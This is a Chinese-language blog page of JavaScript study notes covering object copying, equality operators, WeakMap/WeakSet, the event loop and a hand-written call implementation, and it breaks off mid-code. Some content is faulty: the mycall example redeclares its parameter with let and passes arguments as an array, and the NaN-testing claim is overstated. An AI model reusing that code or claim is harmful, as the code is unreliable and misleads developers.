<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Javascript | 青年家威</title>
    <meta name="generator" content="VuePress 1.7.1">
    <link rel="icon" href="logo.png">
    <meta name="description" content="">
    
    <link rel="preload" href="/assets/css/0.styles.01c1b0ce.css" as="style"><link rel="preload" href="/assets/js/app.81356f24.js" as="script"><link rel="preload" href="/assets/js/2.2bdd9eae.js" as="script"><link rel="preload" href="/assets/js/7.2d2d56a7.js" as="script"><link rel="prefetch" href="/assets/js/10.1c6e92fe.js"><link rel="prefetch" href="/assets/js/11.42dbd017.js"><link rel="prefetch" href="/assets/js/12.b4c17f9b.js"><link rel="prefetch" href="/assets/js/13.dcf0a415.js"><link rel="prefetch" href="/assets/js/14.c88356c6.js"><link rel="prefetch" href="/assets/js/15.3b6109c6.js"><link rel="prefetch" href="/assets/js/16.e370d905.js"><link rel="prefetch" href="/assets/js/17.a321d5ca.js"><link rel="prefetch" href="/assets/js/18.3730016e.js"><link rel="prefetch" href="/assets/js/19.51f3d312.js"><link rel="prefetch" href="/assets/js/20.30152331.js"><link rel="prefetch" href="/assets/js/21.3a6ef589.js"><link rel="prefetch" href="/assets/js/22.d0ddbaba.js"><link rel="prefetch" href="/assets/js/23.d530963c.js"><link rel="prefetch" href="/assets/js/3.4918c403.js"><link rel="prefetch" href="/assets/js/4.b04740a9.js"><link rel="prefetch" href="/assets/js/5.bd727705.js"><link rel="prefetch" href="/assets/js/6.a748600d.js"><link rel="prefetch" href="/assets/js/8.090fc473.js"><link rel="prefetch" href="/assets/js/9.adf75988.js">
    <link rel="stylesheet" href="/assets/css/0.styles.01c1b0ce.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">青年家威</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">
  首页
</a></div><div class="nav-item"><a href="/aboutme/" class="nav-link">
  关于我
</a></div><div class="nav-item"><a href="/archite/" class="nav-link">
  架构之路
</a></div><div class="nav-item"><a href="/foundation/" class="nav-link router-link-active">
  技术积累
</a></div><div class="nav-item"><a href="https://juejin.im/user/4300945220716103/posts" target="_blank" rel="noopener noreferrer" class="nav-link external">
  掘金
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div><div class="nav-item"><a href="https://blog.csdn.net/liujiawei00" target="_blank" rel="noopener noreferrer" class="nav-link external">
  CSDN
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">
  首页
</a></div><div class="nav-item"><a href="/aboutme/" class="nav-link">
  关于我
</a></div><div class="nav-item"><a href="/archite/" class="nav-link">
  架构之路
</a></div><div class="nav-item"><a href="/foundation/" class="nav-link router-link-active">
  技术积累
</a></div><div class="nav-item"><a href="https://juejin.im/user/4300945220716103/posts" target="_blank" rel="noopener noreferrer" class="nav-link external">
  掘金
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div><div class="nav-item"><a href="https://blog.csdn.net/liujiawei00" target="_blank" rel="noopener noreferrer" class="nav-link external">
  CSDN
  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <!----></nav>  <ul class="sidebar-links"><li><a href="/foundation/" aria-current="page" class="sidebar-link">技术积累</a></li><li><a href="/foundation/js.html" aria-current="page" class="active sidebar-link">Javascript</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/foundation/js.html#object-assign-和深浅拷贝" class="sidebar-link">Object.assign()和深浅拷贝</a></li><li class="sidebar-sub-header"><a href="/foundation/js.html#和-的区别" class="sidebar-link">== 和=== 的区别</a></li><li class="sidebar-sub-header"><a href="/foundation/js.html#weakmap和weakset" class="sidebar-link">WeakMap和WeakSet</a></li><li class="sidebar-sub-header"><a href="/foundation/js.html#js的事件循环机制" class="sidebar-link">JS的事件循环机制</a></li><li class="sidebar-sub-header"><a href="/foundation/js.html#js原生方法" class="sidebar-link">JS原生方法</a></li><li class="sidebar-sub-header"><a href="/foundation/js.html#flow" class="sidebar-link">Flow</a></li><li class="sidebar-sub-header"><a href="/foundation/js.html#数组去重的n种写法" class="sidebar-link">数组去重的n种写法</a></li><li class="sidebar-sub-header"><a href="/foundation/js.html#js实现继承的几种方法" class="sidebar-link">JS实现继承的几种方法</a></li><li class="sidebar-sub-header"><a href="/foundation/js.html#什么是闭包和闭包的用途" class="sidebar-link">什么是闭包和闭包的用途</a></li><li class="sidebar-sub-header"><a href="/foundation/js.html#for-in-和for-of" class="sidebar-link">for in 和for of</a></li><li class="sidebar-sub-header"><a href="/foundation/js.html#浏览器渲染机制是怎样的-什么是重排-回流-重绘" class="sidebar-link">浏览器渲染机制是怎样的，什么是重排（回流），重绘</a></li><li class="sidebar-sub-header"><a href="/foundation/js.html#i-和-i的区别" class="sidebar-link">i++和++i的区别</a></li><li class="sidebar-sub-header"><a href="/foundation/js.html#json实现深拷贝有什么缺点" class="sidebar-link">JSON实现深拷贝有什么缺点</a></li><li class="sidebar-sub-header"><a href="/foundation/js.html#settimeout和setinterval都用来实现轮询的区别" class="sidebar-link">setTimeout和setInterval都用来实现轮询的区别</a></li><li class="sidebar-sub-header"><a href="/foundation/js.html#事件委托" class="sidebar-link">事件委托</a></li><li class="sidebar-sub-header"><a href="/foundation/js.html#xss攻击" class="sidebar-link">XSS攻击</a></li><li class="sidebar-sub-header"><a href="/foundation/js.html#csrf攻击" class="sidebar-link">CSRF攻击</a></li><li class="sidebar-sub-header"><a href="/foundation/js.html#跨域的解决办法" class="sidebar-link">跨域的解决办法</a></li><li class="sidebar-sub-header"><a href="/foundation/js.html#this的指向问题" class="sidebar-link">this的指向问题</a></li></ul></li><li><a href="/foundation/framework.html" class="sidebar-link">框架</a></li><li><a href="/foundation/css.html" class="sidebar-link">CSS</a></li><li><a href="/foundation/typescript.html" class="sidebar-link">Typescript</a></li><li><a href="/foundation/algorithm.html" class="sidebar-link">算法与数据结构</a></li><li><a href="/foundation/http.html" class="sidebar-link">Http与计算机网络</a></li><li><a href="/foundation/html.html" class="sidebar-link">Html</a></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="javascript"><a href="#javascript" class="header-anchor">#</a> Javascript</h1> <h2 id="object-assign-和深浅拷贝"><a href="#object-assign-和深浅拷贝" class="header-anchor">#</a> Object.assign()和深浅拷贝</h2> <p>1）浅拷贝</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">{</span>
    name<span class="token operator">:</span> <span class="token string">&quot;John&quot;</span><span class="token punctuation">,</span>
    age<span class="token operator">:</span> <span class="token number">30</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">let</span> cloneUser <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>如果user里面有个属性为对象，那么assign对深层次的拷贝为对象地址的引用，例如：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">{</span>
    name<span class="token operator">:</span> <span class="token string">&quot;John&quot;</span><span class="token punctuation">,</span>
    age<span class="token operator">:</span> <span class="token number">30</span><span class="token punctuation">,</span>
    sizes<span class="token operator">:</span> <span class="token punctuation">{</span>
        height<span class="token operator">:</span> <span class="token number">182</span><span class="token punctuation">,</span>
        width<span class="token operator">:</span> <span class="token number">50</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">let</span> cloneUser <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>

user<span class="token punctuation">.</span>sizes<span class="token punctuation">.</span>width<span class="token operator">++</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>cloneUser<span class="token punctuation">.</span>sizes<span class="token punctuation">.</span>width<span class="token punctuation">)</span> <span class="token comment">// 51</span>
</code></pre></div><p>这种嵌套对象的拷贝使用引用的方式拷贝的，称为“浅拷贝”。拷贝的是对象的引用（内存地址），而不是这个对象本身。</p> <p>因此对这个引用的修改，都是作用在同一个对象上的，会导致你不想修改的对象也发生修改。</p> <p>值类型（字符串，数字，布尔值）和引用类型。对值类型的拷贝都是直接拷贝原始值的，所以不会出现这个问题。</p> <p>为了解决此问题，我们应该使用会检查每个 user[key] 的值的克隆循环，如果值是一个对象，那么也要复制它的结构。这就叫“深拷贝”。</p> <p>我们可以自己实现，或者使用loadsh的_.cloneDeep()方法。</p> <p>2）合并多个对象</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">{</span>
    name<span class="token operator">:</span> <span class="token string">&quot;John&quot;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">let</span> permissions1 <span class="token operator">=</span> <span class="token punctuation">{</span>
    canView<span class="token operator">:</span> <span class="token boolean">true</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> permissions2 <span class="token operator">=</span> <span class="token punctuation">{</span>
    canEdit<span class="token operator">:</span> <span class="token boolean">true</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">let</span> clone <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span> permissions1<span class="token punctuation">,</span> permissions2<span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>clone<span class="token punctuation">)</span> <span class="token comment">// {name: &quot;John&quot;,canView: true,canEdit: true}</span>
</code></pre></div><p>如果被拷贝的属性的属性名已经存在，那么它会被覆盖。</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">{</span>
    name<span class="token operator">:</span> <span class="token string">&quot;John&quot;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span> <span class="token punctuation">{</span>
    name<span class="token operator">:</span> <span class="token string">&quot;Pete&quot;</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token comment">//'Pete'</span>
</code></pre></div><h2 id="和-的区别"><a href="#和-的区别" class="header-anchor">#</a> == 和=== 的区别</h2> <p>操作数1 == 操作数2，  操作数1 === 操作数2</p> <p>比较过程：</p> <p>双等号==：</p> <p>（1）如果两个值类型相同，再进行三个等号(===)的比较</p> <p>（2）如果两个值类型不同，也有可能相等，需根据以下规则进行类型转换在比较：</p> <p>1）如果一个是null，一个是undefined，那么相等</p> <p>2）如果一个是字符串，一个是数值，把字符串转换成数值之后再进行比较</p> <p>三等号===:</p> <p>（1）如果类型不同，就一定不相等</p> <p>（2）如果两个都是数值，并且是同一个值，那么相等；如果其中至少一个是NaN，那么不相等。（判断一个值是否是NaN，只能使用isNaN( ) 来判断）</p> <p>（3）如果两个都是字符串，每个位置的字符都一样，那么相等，否则不相等。</p> <p>（4）如果两个值都是true，或是false，那么相等</p> <p>（5）如果两个值都引用同一个对象或是函数，那么相等，否则不相等</p> <p>（6）如果两个值都是null，或是undefined，那么相等</p> <h2 id="weakmap和weakset"><a href="#weakmap和weakset" class="header-anchor">#</a> WeakMap和WeakSet</h2> <p>WeakMap 是类似于 Map 的集合，它仅允许对象作为键，并且一旦通过其他方式无法访问它们，便会将它们与其关联值一同删除。</p> <p>WeakSet 是类似于 Set 的集合，它仅存储对象，并且一旦通过其他方式无法访问它们，便会将其删除。</p> <p>它们都不支持引用所有键或其计数的方法和属性。仅允许单个操作。</p> <p>WeakMap 和 WeakSet 被用作“主要”对象存储之外的“辅助”数据结构。一旦将对象从主存储器中删除，如果该对象仅被用作 WeakMap 或 WeakSet 的键，那么它将被自动清除。</p> <h3 id="weakmap"><a href="#weakmap" class="header-anchor">#</a> WeakMap</h3> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">let</span> john <span class="token operator">=</span> <span class="token punctuation">{</span>
    name<span class="token operator">:</span> <span class="token string">&quot;John&quot;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">let</span> weakMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WeakMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
weakMap<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>john<span class="token punctuation">,</span> <span class="token string">&quot;...&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

john <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token comment">// 覆盖引用</span>

<span class="token comment">// john 被从内存中删除了！</span>
</code></pre></div><p>WeakMap 只有以下的方法：</p> <ul><li>weakMap.get(key)</li> <li>weakMap.set(key, value)</li> <li>weakMap.delete(key)</li> <li>weakMap.has(key)</li></ul> <p>为什么会有这种限制呢？这是技术的原因。如果一个对象丢失了其它所有引用（就像上面示例中的 john），那么它就会被垃圾回收机制自动回收。但是在从技术的角度并不能准确知道 何时会被回收。</p> <p>这些都是由 JavaScript 引擎决定的。JavaScript 引擎可能会选择立即执行内存清理，如果现在正在发生很多删除操作，那么 JavaScript 引擎可能就会选择等一等，稍后再进行内存清理。因此，从技术上讲，WeakMap 的当前元素的数量是未知的。JavaScript 引擎可能清理了其中的垃圾，可能没清理，也可能清理了一部分。因此，暂不支持访问 WeakMap 的所有键/值的方法。</p> <p>使用场景：</p> <ol><li>假如我们正在处理一个“属于”另一个代码的一个对象，也可能是第三方库，并想存储一些与之相关的数据，那么这些数据就应该与这个对象共存亡</li> <li>当一个函数的结果需要被缓存。用 WeakMap 替代 Map，当对象被垃圾回收时，对应的缓存的结果也会被自动地从内存中清除。</li></ol> <h3 id="weakset"><a href="#weakset" class="header-anchor">#</a> WeakSet</h3> <p>WeakSet 支持 <code>add</code>，<code>has</code> 和 <code>delete</code> 方法，但不支持 <code>size</code>和<code>keys()</code>，并且不可迭代。</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">let</span> visitedSet <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WeakSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">let</span> john <span class="token operator">=</span> <span class="token punctuation">{</span>
    name<span class="token operator">:</span> <span class="token string">&quot;John&quot;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> pete <span class="token operator">=</span> <span class="token punctuation">{</span>
    name<span class="token operator">:</span> <span class="token string">&quot;Pete&quot;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> mary <span class="token operator">=</span> <span class="token punctuation">{</span>
    name<span class="token operator">:</span> <span class="token string">&quot;Mary&quot;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

visitedSet<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>john<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// John 访问了我们</span>
visitedSet<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>pete<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 然后是 Pete</span>
visitedSet<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>john<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// John 再次访问</span>

<span class="token comment">// visitedSet 现在有两个用户了</span>

<span class="token comment">// 检查 John 是否来访过？</span>
<span class="token function">alert</span><span class="token punctuation">(</span>visitedSet<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>john<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true</span>

<span class="token comment">// 检查 Mary 是否来访过？</span>
<span class="token function">alert</span><span class="token punctuation">(</span>visitedSet<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>mary<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span>

john <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

<span class="token comment">// visitedSet 将被自动清理</span>
</code></pre></div><h2 id="js的事件循环机制"><a href="#js的事件循环机制" class="header-anchor">#</a> JS的事件循环机制</h2> <p>JS中存在一个叫做执行栈的东西。JS的所有同步代码都在这里执行，当执行一个函数调用时，会创建一个新的执行环境并压到栈中开始执行函数中的代码，当函数中的代码执行完毕后将执行环境从栈中弹出，当栈空了，也就代表执行完毕。</p> <p>这里有一个问题是代码中不只是同步代码，也会有异步代码。当一个异步任务执行完毕后会将任务添加到任务队列中。例如：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token parameter">_</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>
</code></pre></div><p>代码中 <code>setTimeout</code> 会在一秒后将回调函数添加到任务队列中。事实上异步队列也分两种类型：<strong>微任务</strong>、<strong>宏任务</strong>。</p> <p>微任务和宏任务的区别是，当执行栈空了，会检查微任务队列中是否有任务，将微任务队列中的任务依次拿出来执行一遍。当微任务队列空了，从宏任务队列中拿出来一个任务去执行，执行完毕后检查微任务队列，微任务队列空了之后再从宏任务队列中拿出来一个任务执行。这样持续的交替执行任务叫做<strong>事件循环</strong>。</p> <p>属于微任务（microtask）的事件有以下几种：</p> <ul><li>Promise.then</li> <li>MutationObserver</li> <li>Object.observe</li> <li>process.nextTick</li></ul> <p>属于宏任务（macrotask）的事件有以下几种：</p> <ul><li><p>setTimeout</p></li> <li><p>setInterval</p></li> <li><p>setImmediate</p></li> <li><p>MessageChannel</p></li> <li><p>requestAnimationFrame</p></li> <li><p>I/O</p></li> <li><p>UI交互事件</p></li></ul> <p>OK ，其实JS的事件机制也没那么难，现在我们来看个题目：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
        Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve<span class="token punctuation">,</span> reject</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>

        Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>

        <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>

        Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
    Promise<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
<span class="token operator">&gt;</span> <span class="token number">1</span> <span class="token number">2</span> <span class="token number">8</span> <span class="token number">3</span> <span class="token number">7</span> <span class="token number">5</span> <span class="token number">6</span> <span class="token number">4</span>
</code></pre></div><p>有一点点复杂，但是也不是太复杂。</p> <ol><li>主线程进入，第一个setTimeOut是宏任务，那你就到下一次事件循环等着吧。然后Promise里面是同步的，打印1。紧接着就来了resolve，那这个new Promise的then去微任务等着吧（微任务1）。接着执行同步代码，到了8的Promise.resolve().then，那你的回调到微任务里等着（微任务2）。后面没代码了，开始执行这一轮的微任务队列。</li> <li>按顺序，先读微任务1，进来直接打印2，接着读到了3的 Promise.resolve().then ，那你的回调到微任务里去（微任务3），接着是setTimeout的4，这个是宏任务，先放到下一次事件循环里。下面又是一个7的Promise.resolve().then，那你也去微任务（微任务4）。现在微任务1执行完了，微任务里总共还有三个任务。</li> <li>按照微任务的顺序，依次是8，3，7。这一轮的微任务清空了，开始下一轮事件循环。</li> <li>5早就在这等着了，打印5。然后在执行下一次宏任务前需要例行检查，是否有微任务，咦？这一轮还真有一个微任务等着，打印6。微任务清空，开始下一轮事件循环。</li> <li>事件循环里只有一个4，打印4，结束。</li></ol> <h2 id="js原生方法"><a href="#js原生方法" class="header-anchor">#</a> JS原生方法</h2> <h3 id="_1-call"><a href="#_1-call" class="header-anchor">#</a> 1. call</h3> <h3 id="语法"><a href="#语法" class="header-anchor">#</a> 语法</h3> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>thisArg<span class="token punctuation">,</span> arg1<span class="token punctuation">,</span> arg2<span class="token punctuation">,</span> <span class="token operator">...</span><span class="token punctuation">)</span>
</code></pre></div><h3 id="返回值"><a href="#返回值" class="header-anchor">#</a> 返回值</h3> <p>使用参数提供的this值和参数(thisArg, arg1, arg2)，调用该函数(function)执行的返回值。若该方法没有返回值，则返回 <code>undefined</code>。</p> <h3 id="手写call的实现"><a href="#手写call的实现" class="header-anchor">#</a> 手写call的实现</h3> <p>(币安面试题)</p> <p>理解了就很简单，其实核心目的很简单，就是把call函数的调用者的this指向，改为call方法传入的第一个参数的this。</p> <p>那么我们只需要把调用者先卖身给这个参数，然后执行，那么执行的时候this自然就是参数的this，最后我们再把参数上添加的这个调用者清除掉，一别两清，参数恢复原样，调用者也偷到了参数的内部this。</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> test<span class="token operator">=</span><span class="token punctuation">{</span>
  name<span class="token operator">:</span><span class="token string">'liujiawei'</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> test1<span class="token operator">=</span><span class="token punctuation">{</span>
  name<span class="token operator">:</span><span class="token string">'wuyifan'</span><span class="token punctuation">,</span>
  <span class="token function-variable function">fn</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
test1<span class="token punctuation">.</span>fn<span class="token punctuation">.</span><span class="token function-variable function">mycall</span><span class="token operator">=</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">context</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token keyword">let</span> context<span class="token operator">=</span>context <span class="token operator">||</span> window<span class="token punctuation">;</span> <span class="token comment">//不传参数时的降级处理</span>
  context<span class="token punctuation">.</span>fn<span class="token operator">=</span><span class="token keyword">this</span><span class="token punctuation">;</span>  <span class="token comment">// this就是test1.fn这个函数</span>
  <span class="token keyword">let</span> args<span class="token operator">=</span><span class="token punctuation">[</span><span class="token operator">...</span>arguments<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">splice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 第一个参数是context，后面的参数是其他参数</span>
  <span class="token keyword">let</span> result<span class="token operator">=</span>context<span class="token punctuation">.</span><span class="token function">fn</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 执行context.fn，所以fn里面的this的指向当然就是传入的参数context啦</span>
